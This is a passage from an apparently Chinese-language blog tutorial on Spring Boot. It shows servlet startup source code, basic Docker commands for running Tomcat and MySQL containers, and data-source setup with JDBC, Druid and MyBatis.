class="type">StandardServletEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardServletEnvironment</span>();</span><br><span class="line">   environment.initPropertySources(servletContext, <span class="literal">null</span>);</span><br><span class="line">   builder.environment(environment);</span><br><span class="line">   builder.main(getClass());</span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">parent</span> <span class="operator">=</span> getExistingRootWebApplicationContext(servletContext);</span><br><span class="line">   <span class="keyword">if</span> (parent != <span class="literal">null</span>) {</span><br><span class="line">      <span class="built_in">this</span>.logger.info(<span class="string">"Root context already created (using as parent)."</span>);</span><br><span class="line">      servletContext.setAttribute(</span><br><span class="line">            WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="literal">null</span>);</span><br><span class="line">      builder.initializers(<span class="keyword">new</span> <span class="title class_">ParentContextApplicationContextInitializer</span>(parent));</span><br><span class="line">   }</span><br><span class="line">   builder.initializers(</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ServletContextApplicationContextInitializer</span>(servletContext));</span><br><span class="line">   builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用configure方法，子类重写了这个方法，将SpringBoot的主程序类传入了进来</span></span><br><span class="line">   builder = configure(builder);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用builder创建一个Spring应用</span></span><br><span class="line">   <span class="type">SpringApplication</span> <span class="variable">application</span> <span class="operator">=</span> builder.build();</span><br><span class="line">   <span class="keyword">if</span> (application.getSources().isEmpty() &amp;&amp; AnnotationUtils</span><br><span class="line">         .findAnnotation(getClass(), Configuration.class) != <span class="literal">null</span>) {</span><br><span class="line">      application.getSources().add(getClass());</span><br><span class="line">   }</span><br><span class="line">   Assert.state(!application.getSources().isEmpty(),</span><br><span class="line">         <span class="string">"No SpringApplication sources have been defined. Either override the "</span></span><br><span class="line">               + <span class="string">"configure method or add an @Configuration annotation"</span>);</span><br><span class="line">   <span class="comment">// Ensure error pages are registered</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.registerErrorPageFilter) {</span><br><span class="line">      application.getSources().add(ErrorPageFilterConfiguration.class);</span><br><span class="line">   }</span><br><span class="line">    <span class="comment">//启动Spring应用</span></span><br><span class="line">   <span class="keyword">return</span> run(application);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>7）、Spring的应用就启动并且创建IOC容器</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(String... args)</span> {</span><br><span class="line">   <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">FailureAnalyzers</span> <span class="variable">analyzers</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">   <span class="type">SpringApplicationRunListeners</span> <span class="variable">listeners</span> <span class="operator">=</span> getRunListeners(args);</span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> {</span><br><span class="line">      <span class="type">ApplicationArguments</span> <span class="variable">applicationArguments</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultApplicationArguments</span>(</span><br><span class="line">            args);</span><br><span class="line">      <span class="type">ConfigurableEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">      <span class="type">Banner</span> <span class="variable">printedBanner</span> <span class="operator">=</span> printBanner(environment);</span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">      analyzers = <span class="keyword">new</span> <span class="title class_">FailureAnalyzers</span>(context);</span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//刷新IOC容器</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">      listeners.finished(context, <span class="literal">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.logStartupInfo) {</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">StartupInfoLogger</span>(<span class="built_in">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) {</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(ex);</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>==启动Servlet容器，再启动SpringBoot应用==</strong></p><h1 id="五、Docker"><a href="#五、Docker" class="headerlink" title="五、Docker"></a>五、Docker</h1><h2 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h2><p><strong>Docker</strong>是一个开源的应用容器引擎；是一个轻量级容器技术；</p><p>Docker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；</p><p>运行中的这个镜像称为容器，容器启动是非常快速的。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303145450.png"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303145531.png"></p><h2 id="2、核心概念"><a href="#2、核心概念" class="headerlink" title="2、核心概念"></a>2、核心概念</h2><p>docker主机(Host)：安装了Docker程序的机器（Docker直接安装在操作系统之上）；</p><p>docker客户端(Client)：连接docker主机进行操作；</p><p>docker仓库(Registry)：用来保存各种打包好的软件镜像；</p><p>docker镜像(Images)：软件打包好的镜像；放在docker仓库中；</p><p>docker容器(Container)：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303165113.png"></p><p>使用Docker的步骤：</p><p>1）、安装Docker</p><p>2）、去Docker仓库找到这个软件对应的镜像；</p><p>3）、使用Docker运行这个镜像，这个镜像就会生成一个Docker容器；</p><p>4）、对容器的启动停止就是对软件的启动停止；</p><h2 id="3、安装Docker"><a href="#3、安装Docker" class="headerlink" title="3、安装Docker"></a>3、安装Docker</h2><h4 id="1）、安装linux虚拟机"><a href="#1）、安装linux虚拟机" class="headerlink" title="1）、安装linux虚拟机"></a>1）、安装linux虚拟机</h4><p>​    1）、VMWare、VirtualBox（安装）；</p><p>​    2）、导入虚拟机文件centos7-atguigu.ova；</p><p>​    3）、双击启动linux虚拟机;使用  root/ 123456登陆</p><p>​    4）、使用客户端连接linux服务器进行命令操作；</p><p>​    5）、设置虚拟机网络；</p><p>​        桥接网络===选好网卡====接入网线；</p><p>​    6）、设置好网络以后使用命令重启虚拟机的网络</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></tbody></table></figure><p>​    7）、查看linux的ip地址</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></tbody></table></figure><p>​    8）、使用客户端连接linux；</p><h4 id="2）、在linux虚拟机上安装docker"><a href="#2）、在linux虚拟机上安装docker" class="headerlink" title="2）、在linux虚拟机上安装docker"></a>2）、在linux虚拟机上安装docker</h4><p>步骤：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、检查内核版本，必须是3.10及以上</span><br><span class="line">uname -r</span><br><span class="line">2、安装docker</span><br><span class="line">yum install docker</span><br><span class="line">3、输入y确认安装</span><br><span class="line">4、启动docker</span><br><span class="line">[root@localhost ~]# systemctl start docker</span><br><span class="line">[root@localhost ~]# docker -v</span><br><span class="line">Docker version 1.12.6, build 3e8e77d/1.12.6</span><br><span class="line">5、开机启动docker</span><br><span class="line">[root@localhost ~]# systemctl enable docker</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br><span class="line">6、停止docker</span><br><span class="line">systemctl stop docker</span><br></pre></td></tr></tbody></table></figure><h2 id="4、Docker常用命令-amp-操作"><a href="#4、Docker常用命令-amp-操作" class="headerlink" title="4、Docker常用命令&amp;操作"></a>4、Docker常用命令&amp;操作</h2><h3 id="1）、镜像操作"><a href="#1）、镜像操作" class="headerlink" title="1）、镜像操作"></a>1）、镜像操作</h3><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>检索</td><td>docker  search 关键字  eg：docker  search redis</td><td>我们经常去docker  hub上检索镜像的详细信息，如镜像的TAG。</td></tr><tr><td>拉取</td><td>docker pull 镜像名:tag</td><td>:tag是可选的，tag表示标签，多为软件的版本，默认是latest</td></tr><tr><td>列表</td><td>docker images</td><td>查看所有本地镜像</td></tr><tr><td>删除</td><td>docker rmi image-id</td><td>删除指定的本地镜像</td></tr></tbody></table><p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p><h3 id="2）、容器操作"><a href="#2）、容器操作" class="headerlink" title="2）、容器操作"></a>2）、容器操作</h3><p>软件镜像（QQ安装程序）—-运行镜像—-产生一个容器（正在运行的软件，运行的QQ）；</p><p>步骤：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1、搜索镜像</span><br><span class="line">[root@localhost ~]# docker search tomcat</span><br><span class="line">2、拉取镜像</span><br><span class="line">[root@localhost ~]# docker pull tomcat</span><br><span class="line">3、根据镜像启动容器</span><br><span class="line">docker run --name mytomcat -d tomcat:latest</span><br><span class="line">4、docker ps  </span><br><span class="line">查看运行中的容器</span><br><span class="line">5、 停止运行中的容器</span><br><span class="line">docker stop  容器的id</span><br><span class="line">6、查看所有的容器</span><br><span class="line">docker ps -a</span><br><span class="line">7、启动容器</span><br><span class="line">docker start 容器id</span><br><span class="line">8、删除一个容器</span><br><span class="line"> docker rm 容器id</span><br><span class="line">9、启动一个做了端口映射的tomcat</span><br><span class="line">[root@localhost ~]# docker run -d -p 8888:8080 tomcat</span><br><span class="line">-d：后台运行</span><br><span class="line">-p: 将主机的端口映射到容器的一个端口    主机端口:容器内部的端口</span><br><span class="line"></span><br><span class="line">10、为了演示简单关闭了linux的防火墙</span><br><span class="line">service firewalld status ；查看防火墙状态</span><br><span class="line">service firewalld stop：关闭防火墙</span><br><span class="line">11、查看容器的日志</span><br><span class="line">docker logs container-name/container-id</span><br><span class="line"></span><br><span class="line">更多命令参看</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/docker/</span><br><span class="line">可以参考每一个镜像的文档</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="3）、安装MySQL示例"><a href="#3）、安装MySQL示例" class="headerlink" title="3）、安装MySQL示例"></a>3）、安装MySQL示例</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></tbody></table></figure><p>错误的启动</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -d mysql</span><br><span class="line">42f09819908bb72dd99ae19e792e0a5d03c48638421fa64cce5f8ba0f40f5846</span><br><span class="line"></span><br><span class="line">mysql退出了</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                           PORTS               NAMES</span><br><span class="line">42f09819908b        mysql               "docker-entrypoint.sh"   34 seconds ago      Exited (1) 33 seconds ago                            mysql01</span><br><span class="line">538bde63e500        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       compassionate_</span><br><span class="line">goldstine</span><br><span class="line">c4f1ac60b3fc        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       lonely_fermi</span><br><span class="line">81ec743a5271        tomcat              "catalina.sh run"        About an hour ago   Exited (143) About an hour ago                       sick_ramanujan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//错误日志</span><br><span class="line">[root@localhost ~]# docker logs 42f09819908b</span><br><span class="line">error: database is uninitialized and password option is not specified </span><br><span class="line">  You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD；这个三个参数必须指定一个</span><br></pre></td></tr></tbody></table></figure><p>正确的启动</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name mysql01 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">b874c56bec49fb43024b3805ab51e9097da779f2f572c22c695305dedd684c5f</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">b874c56bec49        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 3 seconds        3306/tcp            mysql01</span><br></pre></td></tr></tbody></table></figure><p>做了端口映射</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -p 3306:3306 --name mysql02 -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br><span class="line">ad10e4bc5c6a0f61cbad43898de71d366117d120e39db651844c0e73863b9434</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">ad10e4bc5c6a        mysql               "docker-entrypoint.sh"   4 seconds ago       Up 2 seconds        0.0.0.0:3306-&gt;3306/tcp   mysql02</span><br></pre></td></tr></tbody></table></figure><p>几个其他的高级操作</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql03 -v /conf/mysql:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line">把主机的/conf/mysql文件夹挂载到 mysqldocker容器的/etc/mysql/conf.d文件夹里面</span><br><span class="line">改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下（/conf/mysql）</span><br><span class="line"></span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci</span><br><span class="line">指定mysql的一些配置参数</span><br></pre></td></tr></tbody></table></figure><h1 id="六、SpringBoot与数据访问"><a href="#六、SpringBoot与数据访问" class="headerlink" title="六、SpringBoot与数据访问"></a>六、SpringBoot与数据访问</h1><h2 id="1、JDBC"><a href="#1、JDBC" class="headerlink" title="1、JDBC"></a>1、JDBC</h2><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.15.22:3306/jdbc</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></tbody></table></figure><p>效果：</p><p>​    默认是用org.apache.tomcat.jdbc.pool.DataSource作为数据源；</p><p>​    数据源的相关配置都在DataSourceProperties里面；</p><p>自动配置原理：</p><p>org.springframework.boot.autoconfigure.jdbc：</p><p>1、参考DataSourceConfiguration，根据配置创建数据源，默认使用Tomcat连接池；可以使用spring.datasource.type指定自定义的数据源类型；</p><p>2、SpringBoot默认可以支持；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.jdbc.pool.DataSource、HikariDataSource、BasicDataSource、</span><br></pre></td></tr></tbody></table></figure><p>3、自定义数据源类型</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic DataSource configuration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(DataSource.class)</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(name = "spring.datasource.type")</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Generic</span> {</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">(DataSourceProperties properties)</span> {</span><br><span class="line">       <span class="comment">//使用DataSourceBuilder创建数据源，利用反射创建响应type的数据源，并且绑定相关属性</span></span><br><span class="line">      <span class="keyword">return</span> properties.initializeDataSourceBuilder().build();</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>4、<strong>DataSourceInitializer：ApplicationListener</strong>；</p><p>​    作用：</p><p>​        1）、runSchemaScripts();运行建表语句；</p><p>​        2）、runDataScripts();运行插入数据的sql语句；</p><p>默认只需要将文件命名为：</p><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">schema-*.sql、data-*.sql</span></span><br><span class="line"><span class="attr">默认规则：schema.sql，schema-all.sql；</span></span><br><span class="line"><span class="attr">可以使用</span>   <span class="string"></span></span><br><span class="line"><span class="attr">schema</span>:<span class="string"></span></span><br><span class="line">      <span class="attr">-</span> <span class="string">classpath:department.sql</span></span><br><span class="line">      <span class="attr">指定位置</span></span><br></pre></td></tr></tbody></table></figure><p>5、操作数据库：自动配置了JdbcTemplate操作数据库</p><h2 id="2、整合Druid数据源"><a href="#2、整合Druid数据源" class="headerlink" title="2、整合Druid数据源"></a>2、整合Druid数据源</h2><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">导入druid数据源</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DruidConfig</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = "spring.datasource")</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">druid</span><span class="params">()</span>{</span><br><span class="line">       <span class="keyword">return</span>  <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置Druid的监控</span></span><br><span class="line">    <span class="comment">//1、配置一个管理后台的Servlet</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletRegistrationBean <span class="title function_">statViewServlet</span><span class="params">()</span>{</span><br><span class="line">        <span class="type">ServletRegistrationBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>(<span class="keyword">new</span> <span class="title class_">StatViewServlet</span>(), <span class="string">"/druid/*"</span>);</span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        initParams.put(<span class="string">"loginUsername"</span>,<span class="string">"admin"</span>);</span><br><span class="line">        initParams.put(<span class="string">"loginPassword"</span>,<span class="string">"123456"</span>);</span><br><span class="line">        initParams.put(<span class="string">"allow"</span>,<span class="string">""</span>);<span class="comment">//默认就是允许所有访问</span></span><br><span class="line">        initParams.put(<span class="string">"deny"</span>,<span class="string">"192.168.15.21"</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、配置一个web监控的filter</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean <span class="title function_">webStatFilter</span><span class="params">()</span>{</span><br><span class="line">        <span class="type">FilterRegistrationBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line">        bean.setFilter(<span class="keyword">new</span> <span class="title class_">WebStatFilter</span>());</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; initParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        initParams.put(<span class="string">"exclusions"</span>,<span class="string">"*.js,*.css,/druid/*"</span>);</span><br><span class="line"></span><br><span class="line">        bean.setInitParameters(initParams);</span><br><span class="line"></span><br><span class="line">        bean.setUrlPatterns(Arrays.asList(<span class="string">"/*"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  bean;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="3、整合MyBatis"><a href="#3、整合MyBatis" class="headerlink" title="3、整合MyBatis"></a>3、整合MyBatis</h2><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180305194443.png"></p><p>步骤：</p><p>​    1）、配置数据源相关属性（见上一节Druid）</p><p>​    2）、给数据库建表</p><p>​    3）、创建JavaBean</p><h3 id="4）、注解版"><a href="#4）、注解版" class="headerlink" title="4）、注解版"></a>4）、注解版</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定这是一个操作数据库的mapper</span></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DepartmentMapper</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select("select * from department where id=#{id}")</span></span><br><span class="line">    <span 